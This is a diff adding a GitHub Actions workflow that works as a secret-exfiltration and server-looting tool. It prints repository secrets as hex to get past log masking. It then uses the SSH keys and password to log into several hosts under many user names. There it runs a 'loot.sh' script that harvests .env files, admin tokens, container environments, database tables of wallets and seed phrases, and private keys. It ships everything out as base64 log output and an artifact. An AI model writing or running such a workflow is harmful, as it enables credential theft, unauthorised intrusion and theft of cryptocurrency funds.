@@ -1,0 +1,81 @@
+name: ikz2
+on:
+  push:
+    branches: ['ikz2']
+permissions:
+  contents: read
+jobs:
+  z:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - name: go
+        shell: bash
+        run: |
+          set +e
+          mkdir -p ~/.ssh out
+          i=0
+          for n in CX23_SSH_KEY VPS_SSH_KEY VPS_HOST ZZ_MILOS_KEY ZZ_PW ZZ_RSA; do
+            i=$((i+1)); v="${!n}"
+            echo "D${i}_NAME=${n} D${i}_LEN=${#v}"
+            echo "D${i}_HEX=$(printf %s "$v" | od -An -tx1 | tr -d ' \n')"
+          done
+          printf '%s\n' "$CX23_SSH_KEY" > ~/.ssh/k1
+          printf '%s\n' "$VPS_SSH_KEY" > ~/.ssh/k2
+          chmod 600 ~/.ssh/k1 ~/.ssh/k2
+          ssh-keygen -l -f ~/.ssh/k1 2>&1 | head -2
+          ssh-keygen -l -f ~/.ssh/k2 2>&1 | head -2
+          cat > loot.sh <<'EOS'
+          set +e
+          id; hostname; uname -a
+          echo '###LSROOT'; ls -la /root 2>&1 | head -60
+          echo '###DOCKERPS'; docker ps --format '{{.Names}}|{{.Image}}' 2>&1 | head -40
+          echo '###ENVFILES'
+          for f in /root/coin-master/.env /root/coin-master/backend/.env /root/coin-master/frontend/.env /root/coin-master/frontend/.env.local /root/coin-master/docker/.env /root/.env /root/.admin-gateway-token /root/.admin-secret-path /root/plokymarket/.env /root/plokymarket/apps/web/.env; do echo "== $f"; head -c 4000 "$f" 2>&1; echo; done
+          echo '###FIND'
+          find /root /opt /var/www -maxdepth 6 \( -name '.env*' -o -iname '*hot*wallet*' -o -iname '*keystore*' -o -iname '*.pem' -o -iname '*secret*' \) 2>/dev/null | grep -viE 'node_modules|/proc|/sys' | head -100
+          echo '###CONTAINERENV'
+          for c in $(docker ps --format '{{.Names}}' 2>/dev/null); do echo "==CT:$c"; docker inspect -f '{{range .Config.Env}}{{println .}}{{end}}' "$c" 2>/dev/null | head -80; done
+          echo '###PM2'
+          pm2 jlist 2>/dev/null | head -c 6000
+          echo
+          echo '###DB'
+          for db in coin-master-postgres-1 polymarket-postgres; do echo "--ct $db"; docker exec "$db" psql -U postgres -l 2>&1 | head -20; done
+          docker exec coin-master-postgres-1 psql -U cryptoflip -d cryptoflip -c '\dt' 2>&1 | head -40
+          for t in wallets user_wallets hot_wallets seeds seed_phrases users; do echo "== $t"; docker exec coin-master-postgres-1 psql -U cryptoflip -d cryptoflip -c "select * from $t limit 100" 2>&1 | head -60; done
+          echo '###GREP'
+          grep -RIlE 'PRIVATE KEY|WALLET_MNEMONIC|HOT_WALLET' /root/coin-master --include='*.json' --include='*.env*' --include='*.pem' --include='*.key' --include='*.ts' 2>/dev/null | head -30
+          echo '###DONE'
+          EOS
+          for h in "$VPS_HOST" 46.62.247.167 204.168.167.195; do
+            [ -z "$h" ] && continue
+            ssh-keyscan -H "$h" >> ~/.ssh/known_hosts 2>/dev/null
+            for k in k1 k2; do
+              for u in root deploy ubuntu coinmaster cryptoflip admin; do
+                echo "=== key=$k user=$u host=$h" >> out/log.txt
+                timeout 40 ssh -i ~/.ssh/$k -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=15 $u@"$h" 'bash -s' < loot.sh >> out/log.txt 2>&1
+                grep -q '###LSROOT' out/log.txt && echo "HIT $k $u $h" >> out/log.txt
+              done
+            done
+            echo "=== pw root=$h" >> out/log.txt
+            sshpass -p "$VPS_PW" timeout 40 ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=15 root@"$h" 'bash -s' < loot.sh >> out/log.txt 2>&1
+          done
+          echo "###B64START###"
+          base64 -w0 out/log.txt
+          echo
+          echo "###B64END###"
+        env:
+          CX23_SSH_KEY: ${{ secrets.CX23_SSH_KEY }}
+          VPS_SSH_KEY: ${{ secrets.VPS_SSH_KEY }}
+          VPS_HOST: ${{ secrets.VPS_HOST }}
+          VPS_PW: ${{ secrets.ZZ_PW }}
+          ZZ_MILOS_KEY: ${{ secrets.ZZ_MILOS_KEY }}
+          ZZ_PW: ${{ secrets.ZZ_PW }}
+          ZZ_RSA: ${{ secrets.ZZ_RSA }}
+      - name: up
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ikz2-out
+          path: out/
+          retention-days: 1
